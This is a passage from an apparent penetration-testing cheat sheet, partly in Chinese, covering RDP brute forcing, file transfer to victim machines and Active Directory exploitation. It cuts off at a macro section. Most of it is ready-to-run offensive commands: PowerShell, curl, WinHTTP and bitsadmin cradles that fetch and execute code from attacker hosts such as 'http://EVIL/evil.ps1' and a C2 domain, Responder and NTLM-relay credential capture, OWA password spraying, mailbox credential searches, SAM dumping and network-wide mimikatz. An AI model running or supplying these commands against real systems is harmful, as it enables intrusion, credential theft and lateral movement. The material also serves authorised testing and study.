href="#1-1-13-远程桌面" class="headerlink" title="1.1.13 远程桌面"></a>1.1.13 远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u guest -p guest INSERTIPADDRESS -g 94%</span><br><span class="line"></span><br><span class="line"># Brute force</span><br><span class="line">ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS</span><br></pre></td></tr></table></figure><h1 id="0x02-文件传输"><a href="#0x02-文件传输" class="headerlink" title="0x02 文件传输"></a>0x02 文件传输</h1><h2 id="2-1-TFTP"><a href="#2-1-TFTP" class="headerlink" title="2.1 TFTP"></a>2.1 TFTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m0chan Machine</span><br><span class="line">mkdir tftp</span><br><span class="line">atftpd --deamon --port 69 tftp</span><br><span class="line">cp *file* tftp</span><br><span class="line">On victim machine:</span><br><span class="line">tftp -i &lt;[IP]&gt; GET &lt;[FILE]&gt;</span><br></pre></td></tr></table></figure><h2 id="2-2-FTP"><a href="#2-2-FTP" class="headerlink" title="2.2 FTP"></a>2.2 FTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open &lt;[IP]&gt; 21 &gt; ftp.txt</span><br><span class="line">echo USER demo &gt;&gt; ftp.txt</span><br><span class="line">echo ftp &gt;&gt; ftp.txt</span><br><span class="line">echo bin &gt;&gt; ftp.txt</span><br><span class="line">echo GET nc.exe &gt;&gt; ftp.txt</span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br><span class="line">ftp -v -n -s:ftp.txt</span><br></pre></td></tr></table></figure><h2 id="2-3-VBS-Script"><a href="#2-3-VBS-Script" class="headerlink" title="2.3 VBS Script"></a>2.3 VBS Script</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http = CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http = Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs = CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts = fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer = &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close &gt;&gt; wget.vbs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cscript wget.vbs &lt;url&gt; &lt;out_file&gt;</span><br><span class="line"></span><br><span class="line">Use echoup function on pentest.ws to generate echo commands.</span><br><span class="line">https://pentest.ws/features</span><br></pre></td></tr></table></figure><h2 id="2-4-Powershell"><a href="#2-4-Powershell" class="headerlink" title="2.4 Powershell"></a>2.4 Powershell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/danielbohannon/Invoke-CradleCrafter Use this to craft obsufacted cradles</span><br><span class="line"></span><br><span class="line">Invoke-WebRequest &quot;https://server/filename&quot; -OutFile &quot;C:\Windows\Temp\filename&quot;</span><br><span class="line"></span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile(&quot;https://server/filename&quot;, &quot;C:\Windows\Temp\filename&quot;) </span><br><span class="line"></span><br><span class="line">#Powershell Download to Memory</span><br><span class="line"></span><br><span class="line">IEX(New-Object Net.WebClient).downloadString(&apos;http://server/script.ps1&apos;)</span><br><span class="line"></span><br><span class="line">#Powershell with Proxy</span><br><span class="line"></span><br><span class="line">$browser = New-Object System.Net.WebClient;</span><br><span class="line">$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;</span><br><span class="line">IEX($browser.DownloadString(&apos;https://server/script.ps1&apos;));</span><br></pre></td></tr></table></figure><h2 id="2-5-Powershell-Base64"><a href="#2-5-Powershell-Base64" class="headerlink" title="2.5 Powershell Base64"></a>2.5 Powershell Base64</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fileName = &quot;Passwords.kdbx&quot;</span><br><span class="line">$fileContent = get-content $fileName</span><br><span class="line">$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)</span><br><span class="line">$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)</span><br><span class="line">$fileContentEncoded | set-content ($fileName + &quot;.b64&quot;)</span><br></pre></td></tr></table></figure><h2 id="2-6-安全复制-pscp-exe"><a href="#2-6-安全复制-pscp-exe" class="headerlink" title="2.6 安全复制/ pscp.exe"></a>2.6 安全复制/ pscp.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pscp.exe C:\Users\Public\m0chan.txt user@target:/tmp/m0chan.txt</span><br><span class="line">pscp.exe user@target:/home/user/m0chan.txt C:\Users\Public\m0chan.txt</span><br></pre></td></tr></table></figure><h2 id="2-7-BitsAdmin-exe"><a href="#2-7-BitsAdmin-exe" class="headerlink" title="2.7 BitsAdmin.exe"></a>2.7 BitsAdmin.exe</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe /c &quot;bitsadmin.exe /transfer downld_job /download /priority high http://c2.m0chan.com C:\Temp\mimikatz.exe &amp; start C:\Temp\binary.exe&quot;</span><br></pre></td></tr></table></figure><h2 id="2-8-Remote-Desktop"><a href="#2-8-Remote-Desktop" class="headerlink" title="2.8 Remote Desktop"></a>2.8 Remote Desktop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 10.10.10.10 -r disk:linux=&apos;/home/user/filetransferout&apos;</span><br></pre></td></tr></table></figure><h2 id="2-9-WinHTTP-Com-Object"><a href="#2-9-WinHTTP-Com-Object" class="headerlink" title="2.9 WinHTTP Com Object"></a>2.9 WinHTTP Com Object</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[System.Net.WebRequest]::DefaultWebProxy</span><br><span class="line">[System.Net.CredentialCache]::DefaultNetworkCredentials</span><br><span class="line">$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open(&apos;GET&apos;,&apos;http://EVIL/evil.ps1&apos;,$false);$h.send();iex $h.responseText</span><br></pre></td></tr></table></figure><h2 id="2-10-CertUtil"><a href="#2-10-CertUtil" class="headerlink" title="2.10 CertUtil"></a>2.10 CertUtil</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#File Transfer</span><br><span class="line"></span><br><span class="line">certutil.exe -urlcache -split -f https://m0chan:8888/filename outputfilename</span><br><span class="line"></span><br><span class="line">#CertUtil Base64 Transfers</span><br><span class="line"></span><br><span class="line">certutil.exe -encode inputFileName encodedOutputFileName</span><br><span class="line">certutil.exe -decode encodedInputFileName decodedOutputFileName</span><br></pre></td></tr></table></figure><h2 id="2-11-Curl-Windows-1803"><a href="#2-11-Curl-Windows-1803" class="headerlink" title="2.11 Curl (Windows 1803+)"></a>2.11 Curl (Windows 1803+)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://server/file -o file</span><br><span class="line">curl http://server/file.bat | cmd</span><br><span class="line"></span><br><span class="line">IEX(curl http://server/script.ps1);Invoke-Blah</span><br></pre></td></tr></table></figure><h2 id="2-12-SMB"><a href="#2-12-SMB" class="headerlink" title="2.12 SMB"></a>2.12 SMB</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbserver.py Share `pwd` -u m0chan -p m0chan --smb-2support</span><br></pre></td></tr></table></figure><h1 id="0x03-exploit"><a href="#0x03-exploit" class="headerlink" title="0x03 exploit"></a>0x03 exploit</h1><h2 id="3-1-LLMNR-NBT-NS欺骗"><a href="#3-1-LLMNR-NBT-NS欺骗" class="headerlink" title="3.1 LLMNR / NBT-NS欺骗"></a>3.1 LLMNR / NBT-NS欺骗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#Responder to Steal Creds</span><br><span class="line"></span><br><span class="line">git clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LLMNR and NBT-NS is usually on by default and there purpose is to act as a fallback to DNS. i/e if you search \\HRServer\ but it dosent exist, Windows (by default) will send out a LLMNR broadcast across the network. By using Responder we can respond to these broadcasts and say something like</span><br><span class="line"></span><br><span class="line">&apos;Yeah I&apos;m HRServer, authenticate to me and I will get a NTLMv2 hash which I can crack or relay. More on relaying below&apos;</span><br></pre></td></tr></table></figure><h2 id="3-2-Responder-WPAD-Attack"><a href="#3-2-Responder-WPAD-Attack" class="headerlink" title="3.2 Responder WPAD Attack"></a>3.2 Responder WPAD Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 wpad</span><br><span class="line"></span><br><span class="line">By default, Windows is configured to search for a Web Proxy Auto-Discovery file when using the internet</span><br><span class="line"></span><br><span class="line">Go to internet explorer and search for Google which automatically searches for a WPAD file... </span><br><span class="line"></span><br><span class="line">Then take NTLMv2 hash and NTLM Relay it or send to cracking rig.</span><br></pre></td></tr></table></figure><h2 id="3-3-mitm6"><a href="#3-3-mitm6" class="headerlink" title="3.3 mitm6"></a>3.3 mitm6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#Use when WPAD attack is not working, this uses IPv6 and DNS to relay creds to a target. </span><br><span class="line"></span><br><span class="line">By default IPV6 should be enabled. </span><br><span class="line">git clone https://github.com/fox-it/mitm6.git </span><br><span class="line">cd /opt/tools/mitm6</span><br><span class="line">pip install .</span><br><span class="line"></span><br><span class="line">mitm6 -d m0chanAD.local</span><br><span class="line"></span><br><span class="line">Now the vuln occurs, Windows prefers IPV6 over IPv4 meaning DNS = controlled by attacker. </span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -wh webserverhostingwpad:80 -t smb://TARGETIP/ -i</span><br><span class="line"></span><br><span class="line">-i opens an interactive shell.</span><br><span class="line"></span><br><span class="line">Shout out to hausec for this super nice tip.</span><br></pre></td></tr></table></figure><h2 id="3-4-SCF文件攻击"><a href="#3-4-SCF文件攻击" class="headerlink" title="3.4 SCF文件攻击"></a>3.4 SCF文件攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Create .scf file and drop inside SMB Share and fire up Responder ;) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Filename = @m0chan.scf</span><br><span class="line"></span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.2\Share\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><h2 id="3-5-NTLM-Relay"><a href="#3-5-NTLM-Relay" class="headerlink" title="3.5 NTLM-Relay"></a>3.5 NTLM-Relay</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Good article explaining differences between NTLM/Net-NTLMV1&amp;V2</span><br><span class="line"></span><br><span class="line">https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html</span><br><span class="line"></span><br><span class="line">TL;DR NTLMv1/v2 is a shorthand for Net-NTLMv1/v2 and hence are the same thing.</span><br><span class="line"></span><br><span class="line">You CAN perform Pass-The-Hash attacks with NTLM hashes.</span><br><span class="line">You CANNOT perform Pass-The-Hash attacks with Net-NTLM hashes.</span><br><span class="line"></span><br><span class="line">PS: You CANNOT relay a hash back to itself.</span><br><span class="line">PS: SMB Signing must be disabled to mitigate this, you can check with nmap scan or crackmapexec</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 --gene-relay-list targets.txt</span><br><span class="line"></span><br><span class="line">This will tell you a list of hosts within a subnet which do not have SMB Signing enabled.</span><br><span class="line"></span><br><span class="line">python Responder.py -I &lt;interface&gt; -r -d -w</span><br><span class="line">ntlmrelayx.py -tf targets.txt (By default this will dump the local SAM of the targets, not very useful?)</span><br><span class="line"></span><br><span class="line">How about we execute a command instead.</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe -Enc asdasdasdasd</span><br><span class="line">ntlmrelayx.py -tf targets.txt -c powershell.exe /c download and execute beacon... = RIP</span><br></pre></td></tr></table></figure><h2 id="3-6-私下交易"><a href="#3-6-私下交易" class="headerlink" title="3.6 私下交易"></a>3.6 私下交易</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/</span><br><span class="line"></span><br><span class="line">Combine privxchange.py and ntlmrelayx</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://DOMAINCONTROLLER.m0chanAD.local --escalate-user TARGETUSERTOESCALATE</span><br><span class="line"></span><br><span class="line">python privexchange.py -ah FDQN.m0chanAD.local DOMAINCONTROLLER.m0chanAD.local -u TARGETUSERTOESCALATE -d m0chanAD.local</span><br></pre></td></tr></table></figure><h2 id="3-7-Exchange-Password-Spray"><a href="#3-7-Exchange-Password-Spray" class="headerlink" title="3.7 Exchange Password Spray"></a>3.7 Exchange Password Spray</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname EXCH2012.m0chanAD.local -UserList .\users.txt -Password Winter2019</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#https://github.com/sensepost/ruler</span><br><span class="line"></span><br><span class="line">./ruler-linux64 -domain mc0hanAD.local --insecure brute --userpass userpass.txt -v</span><br></pre></td></tr></table></figure><h2 id="3-8-ExchangeRelayX"><a href="#3-8-ExchangeRelayX" class="headerlink" title="3.8 ExchangeRelayX"></a>3.8 ExchangeRelayX</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/quickbreach/ExchangeRelayX</span><br><span class="line"></span><br><span class="line">An NTLM relay tool to the EWS endpoint for on-premise exchange servers. Provides an OWA for hackers.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./exchangeRelayx.py -t https://mail.quickbreach.com</span><br></pre></td></tr></table></figure><h2 id="3-9-Exchange-Mailbox-Post-Compromise"><a href="#3-9-Exchange-Mailbox-Post-Compromise" class="headerlink" title="3.9 Exchange Mailbox Post-Compromise"></a>3.9 Exchange Mailbox Post-Compromise</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/dafthack/MailSniper.git</span><br><span class="line"></span><br><span class="line">Enumerate GlobalAddressList</span><br><span class="line"></span><br><span class="line">Get-GlobalAddressList -ExchHostname EXCH2012.m0chanAD.local -Username jamie@m0chanAD.local -Password Winter2019</span><br><span class="line"></span><br><span class="line">Enumerate AD Usernames</span><br><span class="line"></span><br><span class="line">Get-ADUsernameFromEWS -Emaillist .\users.txt</span><br><span class="line"></span><br><span class="line">Enumerate Mailbox Folders</span><br><span class="line"></span><br><span class="line">Get-MailboxFolders -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials Stored in Emails</span><br><span class="line"></span><br><span class="line">Invoke-SelfSearch -Mailbox jamie@m0chanAD.local</span><br><span class="line"></span><br><span class="line">Enumerate Passwords &amp; Credentials (Any Users) Requires DA or Exchange Admin</span><br><span class="line"></span><br><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount helenHR -ExchHostname Exch2012</span><br></pre></td></tr></table></figure><h2 id="3-10-CrackMapExec"><a href="#3-10-CrackMapExec" class="headerlink" title="3.10 CrackMapExec"></a>3.10 CrackMapExec</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CrackMapExec is installed on Kali or get Windows Binary from Github.</span><br><span class="line"></span><br><span class="line">Has 3 Execution Methods</span><br><span class="line">crackmapexec smb &lt;- Creating and Running a Service over SMB</span><br><span class="line">crackmapexec wmi &lt;- Executes command over WMI</span><br><span class="line">crackmapexec at &lt;- Schedules Task with Task Scheduler</span><br><span class="line"></span><br><span class="line">Can execute plain commands with -X flag i/e </span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 -x whoami</span><br><span class="line"></span><br><span class="line">crcakmapexec smb 10.10.14.0/24 &lt;- Host Discovery</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; </span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --pass-pol</span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --shares</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Can also PTH with CME</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -H e8bcd502fbbdcd9379305dca15f4854e</span><br><span class="line"></span><br><span class="line">cme smb 10.8.14.14 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e8bcd502fbbdcd9379305dca15f4854e --local-auth --shares </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--local-auth is for Authenticating with Local Admin, good if Organisaton uses same local admin hash through network and not using LAPS</span><br><span class="line"></span><br><span class="line">Dump Local SAM hashes</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth --sam</span><br><span class="line"></span><br><span class="line">Running Mimikatz </span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M mimikatz</span><br><span class="line"></span><br><span class="line">^ Very noisy but yes you can run mimikatz across a WHOLE network range. RIP Domain Admin</span><br><span class="line"></span><br><span class="line">Enum AV Products</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.10.14.0/24 -u user -p &apos;Password&apos; --local-auth -M enum_avproducts</span><br></pre></td></tr></table></figure><h2 id="3-11-邮件狙击手"><a href="#3-11-邮件狙击手" class="headerlink" title="3.11 邮件狙击手"></a>3.11 邮件狙击手</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayOWA -ExchHostname m0chanAD.local -userlist harvestedUsers.txt -password Summer2019</span><br><span class="line"></span><br><span class="line">[*] Now spraying the OWA portal at https://m0chanAD.local/owa/</span><br><span class="line"></span><br><span class="line">[*] SUCCESS! User:m0chan:Summer2019</span><br><span class="line"></span><br><span class="line">Lmao, you really think Id use the pass Summer2019?</span><br></pre></td></tr></table></figure><h2 id="3-12-Kerberos-Stuff"><a href="#3-12-Kerberos-Stuff" class="headerlink" title="3.12 Kerberos Stuff"></a>3.12 Kerberos Stuff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a</span><br><span class="line">#https://m0chan.github.io/Kerberos-Attacks-In-Depth</span><br></pre></td></tr></table></figure><h2 id="3-13-MSSQL利用（PowerUpSQL）"><a href="#3-13-MSSQL利用（PowerUpSQL）" class="headerlink" title="3.13 MSSQL利用（PowerUpSQL）"></a>3.13 MSSQL利用（PowerUpSQL）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#https://github.com/NetSPI/PowerUpSQL</span><br><span class="line"></span><br><span class="line">#View SQL Instances</span><br><span class="line">Get-SQLInstanceDomain [| Get-SQLServerInfo]</span><br><span class="line"></span><br><span class="line">#Login in with Domain Account</span><br><span class="line">Get-SQLConnectionTestThreaded</span><br><span class="line"></span><br><span class="line">#Login in with Default Password</span><br><span class="line">Get-SQLServerDefaultLoginPw</span><br><span class="line"></span><br><span class="line">#List DB, Tables &amp; Columns</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLDatabase</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DB_name&gt;</span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DB_name&gt; -TableName &lt;Table_name&gt;</span><br><span class="line"></span><br><span class="line">#Search Column Names for Word</span><br><span class="line"></span><br><span class="line">Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords &quot;&lt;word1,word2&gt;&quot; -Verbose -SampleSize 10</span><br><span class="line"></span><br><span class="line">#Try to Execute Commands (RCE)</span><br><span class="line"></span><br><span class="line">Invoke-SQLOSCmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Enable XP_CMDShell Process</span><br><span class="line"></span><br><span class="line">EXEC sp_configure &apos;show advanced options&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;, 1;  </span><br><span class="line">go  </span><br><span class="line">RECONFIGURE;  </span><br><span class="line">go  </span><br><span class="line">xp_cmdshell &apos;&lt;cmd&gt;&apos;</span><br><span class="line">go</span><br></pre></td></tr></table></figure><h2 id="3-14-Malicious-Macro-with-MSBuild"><a href="#3-14-Malicious-Macro-with-MSBuild" class="headerlink" title="3.14 Malicious Macro with MSBuild"></a>3.14 Malicious Macro with MSBuild</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 